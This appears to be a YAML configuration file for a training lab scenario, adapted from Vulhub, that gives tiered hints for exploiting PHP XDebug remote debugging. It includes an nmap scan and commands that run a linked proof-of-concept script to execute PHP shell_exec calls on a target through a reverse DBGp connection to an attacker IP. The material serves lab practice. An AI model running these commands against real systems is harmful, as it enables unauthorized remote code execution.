@@ -1,0 +1,93 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: php/xdebug-rce
+hint_levels:
+  low:
+  - Inspect the php service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080,8081. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080,8081 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): xdebug2: 8080/tcp → container 80/tcp; xdebug3: 8081/tcp → container
+    80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/`, `http://{{NODE_IP}}:8081/`.'
+  high:
+  - 'Vulnerability: PHP XDebug Remote Debugging Code Execution.'
+  - |-
+    Vulnerability Reproduction
+
+    Since the vulnerability requires communication using the DBGp protocol with the target server, it cannot be reproduced using HTTP protocol alone.
+
+    A proof-of-concept exploit script exp.py: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/xdebug-rce/exp.py is provided that can execute arbitrary PHP code on the target server. The script supports both XDebug 2.x (port 9000) and XDebug 3.x (port 9003):
+
+    ```bash
+    # Requires Python 3 and the requests library
+    python3 exp.py -t http://[target-ip]:8080/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
+    python3 exp.py -t http://[target-ip]:8081/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
+    ```
+
+    Successful exploitation will execute the command and return its output:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/xdebug-rce/1.png
+
+    ### Important Notes
+
+    The exploitation process involves a reverse connection:
+
+    1. The exploit script listens on port 9000 (XDebug 2.x) and port 9003 (XDebug 3.x), please make sure these ports are not blocked by the firewall
+    2. You have to have a public IP address or be in the same network as the target
+    3. If your public IP differs from your local machine, use the `--dbgp-ip` parameter to specify the IP address that the target server can reach
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/xdebug-rce/README.md'
+  - |-
+    Additional public references:
+    - https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
+    - https://xdebug.org
+access_instructions:
+  title: PHP XDebug Remote Debugging Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080,8081. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080,8081 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): xdebug2: 8080/tcp → container 80/tcp; xdebug3: 8081/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/`, `http://{{NODE_IP}}:8081/`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      Since the vulnerability requires communication using the DBGp protocol with the target server, it cannot be reproduced using HTTP protocol alone.
+
+      A proof-of-concept exploit script exp.py: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/xdebug-rce/exp.py is provided that can execute arbitrary PHP code on the target server. The script supports both XDebug 2.x (port 9000) and XDebug 3.x (port 9003):
+
+      ```bash
+      # Requires Python 3 and the requests library
+      python3 exp.py -t http://[target-ip]:8080/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
+      python3 exp.py -t http://[target-ip]:8081/index.php -c 'shell_exec("id");' --dbgp-ip [attacker-ip]
+      ```
+
+      Successful exploitation will execute the command and return its output:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/xdebug-rce/1.png
+
+      ### Important Notes
+
+      The exploitation process involves a reverse connection:
+
+      1. The exploit script listens on port 9000 (XDebug 2.x) and port 9003 (XDebug 3.x), please make sure these ports are not blocked by the firewall
+      2. You have to have a public IP address or be in the same network as the target
+      3. If your public IP differs from your local machine, use the `--dbgp-ip` parameter to specify the IP address that the target server can reach
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/xdebug-rce/README.md
+  readme_sha256: e68fba4e1de55aaadad7f8bae4d5b9eb3d1045dc57d14c1cf1f0fc5b2f151872
+  compose_sha256: acd662938df3099ea922a8d1831aae441c75d400d390f1ff3b2e9571cc2fc503
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
